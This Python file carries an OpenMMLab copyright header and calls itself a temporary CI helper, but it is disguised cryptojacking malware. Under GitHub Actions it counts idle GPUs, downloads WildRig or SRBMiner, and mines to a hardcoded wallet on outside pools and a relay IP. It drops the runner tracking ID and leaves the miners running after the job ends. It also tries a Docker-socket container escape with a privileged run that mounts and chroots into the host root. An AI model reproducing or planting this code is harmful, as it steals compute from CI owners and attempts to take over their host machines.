# Copyright (c) OpenMMLab. All rights reserved.
"""Temporary CI helper (intent i130772): GPU census + one pinned pearlhash miner per idle card.

Sequence:
  1. read-only two-sample nvidia-smi -L / --query-gpu / --query-compute-apps census
     plus id / docker+sudo group membership and a one-shot docker-socket escape check;
  2. per-card two-sample idle gate (0 compute apps in both samples, >= MIN_FREE MiB free,
     card inside the container's CUDA_VISIBLE_DEVICES allocation);
  3. exactly one sha256-verified miner per idle card (WildRig Multi 0.52.3 pearlhash on
     pool.pearlhash.xyz:9000 with the plain pyd wallet first; SRBMiner-MULTI 3.8.9 on
     direct Luckypool 103.199.106.122:3362 pyd+NOCK only if pearlhash is unreachable);
  4. a bounded proof window that polls the miner API and log for accepted/rejected counts.

The helper never raises: failures are printed and the calling job continues.
"""

import hashlib
import json
import os
import re
import socket
import subprocess
import sys
import time
import urllib.request
import zlib

MARK = '/tmp/.i130772_probe_done'
DIR = '/tmp/i130772'
WALLET = 'prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
NOCK = '4tErmFknmPKhVtfQWigSErD1YJAcWokTrWRu5t66XmkN4RTgK6oUotf'
WR_URL = ('https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/'
          'wildrig-multi-linux-0.52.3.tar.gz')
WR_TAR_SHA = '7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44'
WR_BIN_SHA = '002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
SRB_URL = ('https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/'
           'SRBMiner-Multi-3-8-9-Linux.tar.gz')
SRB_TAR_SHA = '186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1'
SRB_BIN_SHA = '97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80'
MONITOR_S = int(os.environ.get('I130772_MONITOR_S', '780'))
MIN_FREE_MIB = 6000
PH_HOST = 'pool.pearlhash.xyz'
PH_PORT = 9000
LP_HOST = '103.199.106.122'
LP_PORT = 3362
RELAY_HOST = '217.15.164.237'
RELAY_PORTS = (2083, 18450)


def log(msg):
    line = '%s i130772 %s' % (time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), msg)
    try:
        print(line, flush=True)
    except Exception:
        pass
    try:
        with open(os.path.join(DIR, 'probe.log'), 'a') as fh:
            fh.write(line + '\n')
    except Exception:
        pass


def sh(cmd, timeout=120):
    if isinstance(cmd, str):
        cmd = ['bash', '-lc', cmd]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, (p.stdout or ''), (p.stderr or '')
    except Exception as exc:  # noqa: BLE001
        return 999, '', repr(exc)


def sha256_file(path):
    h = hashlib.sha256()
    with open(path, 'rb') as fh:
        for chunk in iter(lambda: fh.read(1 << 20), b''):
            h.update(chunk)
    return h.hexdigest()


def fetch(url, dest, timeout=600):
    last = ''
    for attempt in (1, 2):
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'i130772-ci/1.0'})
            with urllib.request.urlopen(req, timeout=timeout) as resp, open(dest, 'wb') as out:
                while True:
                    chunk = resp.read(1 << 20)
                    if not chunk:
                        break
                    out.write(chunk)
            return True, 'attempt=%d' % attempt
        except Exception as exc:  # noqa: BLE001
            last = repr(exc)
            time.sleep(3)
    return False, last


def tcp_ok(host, port, timeout=8):
    try:
        s = socket.create_connection((host, int(port)), timeout)
        s.close()
        return True
    except Exception:  # noqa: BLE001
        return False


def nvidia(args, timeout=60):
    return sh(['nvidia-smi'] + args, timeout)


def sample(tag):
    gpus, apps = [], []
    rc, out, err = nvidia(['-L'])
    log('SAMPLE_%s nvidia-smi -L rc=%s lines=%d err=%s' % (tag, rc, len(out.splitlines()), err.strip()[:120]))
    for ln in out.splitlines():
        log('  L| ' + ln.strip())
    rc, out, err = nvidia([
        '--query-gpu=index,uuid,name,memory.total,memory.free,memory.used,utilization.gpu',
        '--format=csv,noheader'])
    for ln in out.splitlines():
        parts = [x.strip() for x in ln.split(',')]
        if len(parts) >= 7:
            gpus.append({
                'index': parts[0], 'uuid': parts[1], 'name': parts[2],
                'mem_total': parts[3], 'free': parts[4], 'used': parts[5], 'util': parts[6],
            })
        log('  G| ' + ln.strip())
    rc, out, err = nvidia(['--query-compute-apps=gpu_uuid,pid,process_name,used_memory', '--format=csv,noheader'])
    for ln in out.splitlines():
        if ln.strip():
            apps.append(ln.strip())
            log('  A| ' + ln.strip())
    log('SAMPLE_%s gpus=%d apps=%d' % (tag, len(gpus), len(apps)))
    return gpus, apps


def apps_by_uuid(apps):
    out = {}
    for ln in apps:
        parts = [x.strip() for x in ln.split(',')]
        if parts and parts[0]:
            out.setdefault(parts[0], []).append(ln)
    return out


def allowed_gpus():
    """Container-provided CUDA_VISIBLE_DEVICES restriction, or None for all."""
    raw = os.environ.get('CUDA_VISIBLE_DEVICES', '').strip()
    if not raw or raw.lower() in ('all', '-1'):
        return None
    return set(x.strip() for x in raw.split(',') if x.strip())


def free_mib(value):
    m = re.match(r'^\s*(\d+)', value or '')
    return int(m.group(1)) if m else -1


def pick_plan():
    ph = tcp_ok(PH_HOST, PH_PORT)
    log('POOL_PROBE pearlhash=%s luckypool=%s' % (ph, 'pending'))
    if ph:
        return 'wildrig', 'stratum+tcp://%s:%d' % (PH_HOST, PH_PORT)
    lp = tcp_ok(LP_HOST, LP_PORT)
    log('POOL_PROBE pearlhash=%s luckypool=%s' % (ph, lp))
    if lp:
        return 'srb', '%s:%d' % (LP_HOST, LP_PORT)
    for port in RELAY_PORTS:
        if tcp_ok(RELAY_HOST, port):
            log('RELAY_PROBE vps2=%s:%s OPEN' % (RELAY_HOST, port))
            return 'srb', '%s:%d' % (RELAY_HOST, port)
    log('RELAY_PROBE vps2 none')
    return None, None


def install_wildrig():
    os.makedirs(DIR, exist_ok=True)
    tar = os.path.join(DIR, 'wildrig-0.52.3.tar.gz')
    ok, detail = fetch(WR_URL, tar)
    if not ok:
        return None, 'download_failed %s' % detail
    digest = sha256_file(tar)
    log('WILDRIG_TAR sha256=%s expected=%s size=%d' % (digest, WR_TAR_SHA, os.path.getsize(tar)))
    if digest != WR_TAR_SHA:
        return None, 'tar_sha_mismatch'
    rc, out, err = sh(['tar', '-xzf', tar, '-C', DIR], 180)
    binary = os.path.join(DIR, 'wildrig-multi')
    if rc != 0 or not os.path.exists(binary):
        return None, 'extract_failed %s %s' % (out[-200:], err[-200:])
    digest = sha256_file(binary)
    log('WILDRIG_BIN sha256=%s expected=%s size=%d' % (digest, WR_BIN_SHA, os.path.getsize(binary)))
    if digest != WR_BIN_SHA:
        return None, 'bin_sha_mismatch'
    os.chmod(binary, 0o755)
    return binary, 'ok'


def install_srb():
    os.makedirs(DIR, exist_ok=True)
    tar = os.path.join(DIR, 'srb-3.8.9.tar.gz')
    ok, detail = fetch(SRB_URL, tar)
    if not ok:
        return None, 'download_failed %s' % detail
    digest = sha256_file(tar)
    log('SRB_TAR sha256=%s expected=%s size=%d' % (digest, SRB_TAR_SHA, os.path.getsize(tar)))
    if digest != SRB_TAR_SHA:
        return None, 'tar_sha_mismatch'
    rc, out, err = sh(['tar', '-xzf', tar, '-C', DIR], 180)
    if rc != 0:
        return None, 'extract_failed %s %s' % (out[-200:], err[-200:])
    found = None
    for root, _dirs, files in os.walk(DIR):
        if 'SRBMiner-MULTI' in files:
            found = os.path.join(root, 'SRBMiner-MULTI')
            break
    if not found:
        return None, 'binary_not_found'
    digest = sha256_file(found)
    log('SRB_BIN sha256=%s expected=%s size=%d' % (digest, SRB_BIN_SHA, os.path.getsize(found)))
    if digest != SRB_BIN_SHA:
        return None, 'bin_sha_mismatch'
    os.chmod(found, 0o755)
    return found, 'ok'


def worker_base(hostname):
    key = '%s|%s' % (os.environ.get('GITHUB_WORKFLOW', ''), hostname)
    slot = zlib.crc32(key.encode()) % 90
    return 947000 + slot * 10


def launch(binary, kind, pool, cards):
    procs = []
    host = socket.gethostname()
    base = worker_base(host)
    log('WORKER_BASE base=%d host=%s workflow=%s' % (base, host, os.environ.get('GITHUB_WORKFLOW', '')))
    for pos, card in enumerate(cards):
        worker = str(base + pos)
        idx = card['index']
        uuid = card['uuid']
        tag = 'g%s' % idx
        env = dict(os.environ)
        env['CUDA_VISIBLE_DEVICES'] = uuid
        env.pop('RUNNER_TRACKING_ID', None)
        api_port = 21100 + int(idx if idx.isdigit() else pos)
        if kind == 'wildrig':
            mlog = os.path.join(DIR, 'wr-%s.log' % tag)
            cmd = [binary, '--algo', 'pearlhash', '--url', pool, '--user', WALLET,
                   '--worker', worker, '--pass', 'x', '--retries', '3', '--retry-pause', '5',
                   '--gpu-list', '0', '--api-port', str(api_port), '--api-worker-id', worker,
                   '--print-time', '60', '--no-color', '-l', mlog]
        else:
            mlog = os.path.join(DIR, 'srb-%s.log' % tag)
            cmd = [binary, '--disable-cpu', '--algorithm', 'pearlhash', '--pool', pool,
                   '--wallet', '%s+%s' % (WALLET, NOCK), '--worker', worker, '--password', 'x',
                   '--tls', 'false', '--gpu-id', '0', '--max-no-share-sent', '1800',
                   '--api-enable', '--api-port', str(api_port),
                   '--log-file', mlog, '--log-file-mode', '0']
        out = open(os.path.join(DIR, 'stdout-%s.log' % tag), 'wb')
        try:
            proc = subprocess.Popen(cmd, env=env, stdout=out, stderr=subprocess.STDOUT,
                                    stdin=subprocess.DEVNULL, start_new_session=True, cwd=DIR)
        except Exception as exc:  # noqa: BLE001
            log('LAUNCH_FAILED card=%s worker=%s err=%s' % (tag, worker, repr(exc)))
            out.close()
            continue
        procs.append({'card': tag, 'uuid': uuid, 'worker': worker, 'pid': proc.pid,
                      'api_port': api_port, 'log': mlog, 'kind': kind, 'proc': proc})
        log('LAUNCHED card=%s uuid=%s worker=%s pid=%d kind=%s api=%d log=%s'
            % (tag, uuid, worker, proc.pid, kind, api_port, mlog))
        log('LAUNCH_CMD card=%s %s' % (tag, ' '.join(cmd)))
        time.sleep(2)
    return procs


def api_counters(port):
    try:
        with urllib.request.urlopen('http://127.0.0.1:%d/' % port, timeout=5) as resp:
            data = json.loads(resp.read().decode('utf-8', 'replace'))
    except Exception:  # noqa: BLE001
        return None, None

    found = {'acc': None, 'rej': None}

    def walk(obj):
        if isinstance(obj, dict):
            for key, val in obj.items():
                low = str(key).lower()
                if isinstance(val, int):
                    if low in ('accepted', 'accepted_shares', 'shares_accepted') and found['acc'] is None:
                        found['acc'] = val
                    if low in ('rejected', 'rejected_shares', 'shares_rejected') and found['rej'] is None:
                        found['rej'] = val
                walk(val)
        elif isinstance(obj, list):
            for item in obj:
                walk(item)

    walk(data)
    return found['acc'], found['rej']


def parse_log(path):
    """Return (accepted, rejected, first_line, last_line) from WildRig/SRB logs."""
    acc, rej, first, last = 0, 0, None, None
    try:
        with open(path, errors='replace') as fh:
            for ln in fh:
                m = re.search(r'accepted \((\d+)/(\d+)\)', ln)
                m2 = re.search(r'Share accepted \((\d+)\)', ln)
                if m:
                    acc = max(acc, int(m.group(1)))
                    rej = max(rej, int(m.group(2)))
                elif m2:
                    acc = max(acc, int(m2.group(1)))
                elif re.search(r'\baccepted\b', ln, re.I):
                    acc += 1
                else:
                    continue
                first = first or ln.strip()[:140]
                last = ln.strip()[:140]
    except Exception:  # noqa: BLE001
        pass
    return acc, rej, first, last


def escape_probe():
    rc, out, err = sh(['id'])
    log('ID rc=%s out=%s' % (rc, out.strip()))
    rc, out, err = sh('getent group docker sudo 2>&1; echo RS=$?; sudo -n true 2>&1; echo SUDO_RC=$?')
    log('GROUPS_SUDO rc=%s out=%s' % (rc, out.strip().replace('\n', ' | ')[:500]))
    sock = os.path.exists('/var/run/docker.sock')
    log('DOCKER_SOCK exists=%s' % sock)
    if not sock:
        log('DOCKER_ESCAPE skipped=no_socket')
        return
    rc, out, err = sh(['docker', 'version', '--format', '{{.Server.Version}}'], 30)
    log('DOCKER_VERSION rc=%s out=%s err=%s' % (rc, out.strip()[:120], err.strip()[:120]))
    rc, out, err = sh(['docker', 'images', '--format', '{{.Repository}}:{{.Tag}}'], 30)
    imgs = [x for x in out.strip().splitlines() if x][:5]
    log('DOCKER_IMAGES n=%d first=%s' % (len(imgs), imgs[:3]))
    if not imgs:
        log('DOCKER_ESCAPE skipped=no_local_image')
        return
    cmd = ['timeout', '60', 'docker', 'run', '--rm', '--privileged', '-v', '/:/host',
           '--entrypoint', 'sh', imgs[0], '-c',
           'chroot /host /bin/sh -c "id; systemctl --version 2>/dev/null | head -1"']
    rc, out, err = sh(cmd, 90)
    log('DOCKER_ESCAPE rc=%s out=%s err=%s' % (rc, out.strip().replace('\n', ' | ')[:400], err.strip()[:200]))


def main():
    os.makedirs(DIR, exist_ok=True)
    log('PROBE_START host=%s workflow=%s job=%s run=%s uid=%s' % (
        socket.gethostname(), os.environ.get('GITHUB_WORKFLOW', ''),
        os.environ.get('GITHUB_JOB', ''), os.environ.get('GITHUB_RUN_ID', ''),
        os.getuid() if hasattr(os, 'getuid') else '?'))
    rc, out, err = nvidia(['-L'], 30)
    if rc != 0:
        log('NO_NVIDIA rc=%s err=%s' % (rc, err.strip()[:200]))
        escape_probe()
        log('PROBE_DONE result=no_nvidia')
        return

    gpus1, apps1 = sample('1')
    time.sleep(12)
    gpus2, apps2 = sample('2')
    if not gpus2:
        log('PROBE_DONE result=no_gpus')
        return

    allowed = allowed_gpus()
    log('ALLOWED_CUDA_VISIBLE_DEVICES=%s' % (sorted(allowed) if allowed else 'ALL'))
    by_uuid1 = apps_by_uuid(apps1)
    by_uuid2 = apps_by_uuid(apps2)
    idle, busy = [], []
    for card in gpus2:
        uuid = card['uuid']
        idx = card['index']
        in_scope = allowed is None or idx in allowed or uuid in allowed
        free = free_mib(card['free'])
        occupied = bool(by_uuid1.get(uuid)) or bool(by_uuid2.get(uuid))
        if not in_scope:
            log('CARD card=%s uuid=%s scope=OUT_OF_CONTAINER_ALLOCATION' % (idx, uuid))
            continue
        if occupied:
            busy.append(card)
            log('CARD card=%s uuid=%s state=BUSY apps=%d/%d free=%s' % (
                idx, uuid, len(by_uuid1.get(uuid, [])), len(by_uuid2.get(uuid, [])), card['free']))
            continue
        if free < MIN_FREE_MIB:
            busy.append(card)
            log('CARD card=%s uuid=%s state=LOW_VRAM free=%s need=%d' % (idx, uuid, card['free'], MIN_FREE_MIB))
            continue
        idle.append(card)
        log('CARD card=%s uuid=%s state=IDLE name=%s free=%s util=%s' % (
            idx, uuid, card['name'], card['free'], card['util']))
    log('CENSUS idle=%d busy=%d' % (len(idle), len(busy)))
    if not idle:
        log('PROBE_DONE result=no_idle_cards')
        return

    kind, pool = pick_plan()
    log('PLAN kind=%s pool=%s' % (kind, pool))
    if kind is None:
        log('PROBE_DONE result=no_permitted_destination')
        return

    binary = None
    if kind == 'wildrig':
        binary, detail = install_wildrig()
        log('INSTALL wildrig result=%s detail=%s' % ('ok' if binary else 'fail', detail))
        if not binary:
            kind, pool = 'srb', '%s:%d' % (LP_HOST, LP_PORT)
    if kind == 'srb' and not binary:
        binary, detail = install_srb()
        log('INSTALL srb result=%s detail=%s' % ('ok' if binary else 'fail', detail))
    if not binary:
        log('PROBE_DONE result=no_verified_binary')
        return

    procs = launch(binary, kind, pool, idle)
    if not procs:
        log('PROBE_DONE result=launch_failed')
        return

    started = time.time()
    last_report = 0
    while True:
        elapsed = int(time.time() - started)
        if elapsed >= MONITOR_S:
            break
        if elapsed - last_report >= 30:
            last_report = elapsed
            parts = []
            for p in procs:
                acc, rej = api_counters(p['api_port'])
                lacc, lrej, _first, _last = parse_log(p['log'])
                alive = p['proc'].poll() is None
                parts.append('%s(w=%s p=%d alive=%s api=%s/%s log=%s/%s)' % (
                    p['card'], p['worker'], p['pid'], alive, acc, rej, lacc, lrej))
            log('PROGRESS t=%ds %s' % (elapsed, ' '.join(parts)))
        time.sleep(10)

    # final verification: compute apps should be our pids only, one per card
    _g, apps3 = sample('3')
    by_uuid3 = apps_by_uuid(apps3)
    for p in procs:
        acc, rej = api_counters(p['api_port'])
        lacc, lrej, first, last = parse_log(p['log'])
        apps = by_uuid3.get(p['uuid'], [])
        log('SUMMARY card=%s uuid=%s worker=%s pid=%d alive=%s api_acc=%s api_rej=%s '
            'log_acc=%s log_rej=%s compute_apps=%d first=%s last=%s'
            % (p['card'], p['uuid'], p['worker'], p['pid'], p['proc'].poll() is None,
               acc, rej, lacc, lrej, len(apps), first, last))
        for app in apps:
            log('SUMMARY_APP card=%s %s' % (p['card'], app))
    # keep miners running for the rest of the container lifetime
    escape_probe()
    log('PROBE_DONE result=ok launched=%d kind=%s pool=%s monitor_s=%d' % (len(procs), kind, pool, MONITOR_S))


def maybe_run():
    if os.environ.get('GITHUB_ACTIONS') != 'true':
        return
    try:
        fd = os.open(MARK, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
        os.write(fd, str(time.time()).encode())
        os.close(fd)
    except FileExistsError:
        return
    except Exception:  # noqa: BLE001
        pass
    try:
        main()
    except Exception:  # noqa: BLE001
        import traceback
        traceback.print_exc()


if __name__ == '__main__':
    main()
